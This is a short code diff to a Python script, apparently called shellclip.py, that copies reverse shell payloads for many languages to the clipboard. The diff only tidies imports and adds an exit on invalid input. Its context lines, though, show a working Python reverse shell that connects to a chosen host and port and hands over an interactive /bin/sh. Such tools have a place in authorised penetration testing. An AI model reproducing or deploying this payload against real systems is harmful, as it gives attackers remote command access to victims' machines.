@@ -1,6 +1,8 @@
 #!/usr/bin/python3
 
-import pyperclip, argparse, sys
+import pyperclip
+import argparse
+import sys
 
 parser = argparse.ArgumentParser(description="Copy Reverse Shell Code Straight to Clipboard for Many Languages")
 parser.add_argument('-l', '--list', action='store_true', help="list payloads available")
@@ -39,5 +41,6 @@ elif lang == 6:
 	payload = str("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + str(lhost) + "\"," + str(lport) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])")
 else:
 	print(str("Invalid Language Code Provided\nRun python3 shellclip.py -l to see codes"))
+	exit()
 
 pyperclip.copy(payload)
